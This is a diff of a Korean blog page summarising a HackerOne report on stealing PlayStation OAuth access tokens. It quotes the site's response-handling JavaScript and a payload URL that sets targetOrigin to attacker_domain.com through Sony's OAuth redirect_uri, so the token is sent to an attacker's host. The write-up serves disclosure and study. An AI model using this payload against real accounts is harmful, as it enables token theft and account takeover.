@@ -241,7 +241,7 @@
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://hackerone.com/reports/821896">Access token stealing in playstation</a></p>
-<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/">https://my.playstation.com</a></p>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com">https://my.playstation.com</a></p>
 <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCF58;&#xC194; &#xAC8C;&#xC784;&#xAE30;&#xAE30;&#xC778; PlayStation&#xC758; &#xCEE4;&#xBBA4;&#xB2C8;&#xD2F0; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/auth/response.html">https://my.playstation.com/auth/response.html</a> &#xC5D0;&#xC11C; &#xB85C;&#xADF8;&#xC778;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; Access Token&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com">https://my.playstation.com/auth/response.html?requestID=iframe_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://my.playstation.com</a> &#xD398;&#xC774;&#xC9C0;&#xB294; &#xBC1C;&#xAE09; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB85C; OAuth &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD638;&#xC2A4;&#xD305; &#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseResponse</span>(<span class="hljs-params">a</span>) </span>{
@@ -271,7 +271,6 @@
 
 <span class="hljs-keyword">var</span> response = parseResponse(<span class="hljs-built_in">window</span>.location);
 sendResponseToApp(response);</code></pre>
-
 <p>&#xD638;&#xC2A4;&#xD305;&#xB41C; &#xC704; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; &#xC544;&#xB798; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; access token&#xC744; &#xD574;&#xCEE4;&#xC758; &#xC11C;&#xBC84;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ol>
 <li>request query&#xB97C; <code>parseResponse()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD55C; &#xB4A4;  <code>sendResponseToApp()</code> &#xC758; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD574; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li>
@@ -280,10 +279,8 @@ sendResponseToApp(response);</code></pre>
 </ol>
 <p>&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xCD5C;&#xC885; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs jsx">https:<span class="hljs-comment">//my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com </span></code></pre>
-
 <p>&#xC704; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; OAuth &#xBC1C;&#xAE09; &#xC11C;&#xBC84; request query&#xC758; <code>redirect_uri</code> &#xD544;&#xB4DC; &#xAC12;&#xC73C;&#xB85C; &#xBCF4;&#xB0B4;&#xBA74; Access Token&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs jsx">https:<span class="hljs-comment">//auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;scope=capone:report_submission,kamaji:game_list,kamaji:get_account_hash,user:account.get,user:account.profile.get,kamaji:social_get_graph,kamaji:ugc:distributor,user:account.identityMapper,kamaji:music_views,kamaji:activity_feed_get_feed_privacy,kamaji:activity_feed_get_news_feed,kamaji:activity_feed_submit_feed_story,kamaji:activity_feed_internal_feed_submit_story,kamaji:account_link_token_web,kamaji:ugc:distributor_web,kamaji:url_preview&amp;client_id=656ace0b-d627-47e6-915c-13b259cd06b2&amp;redirect_uri=https://my.playstation.com/auth/response.html?requestID=window_request_ca8b5107-9b8f-4510-9667-15fd7b9327d1&amp;baseUrl=/&amp;targetOrigin=https://attacker_domain.com/&amp;prompt=non</span></code></pre>
-
 
             </div>
             <hr>
@@ -301,9 +298,9 @@ sendResponseToApp(response);</code></pre>
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/javascript/">javascript</a>
-                  
                   <a class="hover-with-bg" href="/tags/L0ch/">L0ch</a>
+                  
+                  <a class="hover-with-bg" href="/tags/javascript/">javascript</a>
                   
                   <a class="hover-with-bg" href="/tags/access-token-stealing/">access token stealing</a>
                   
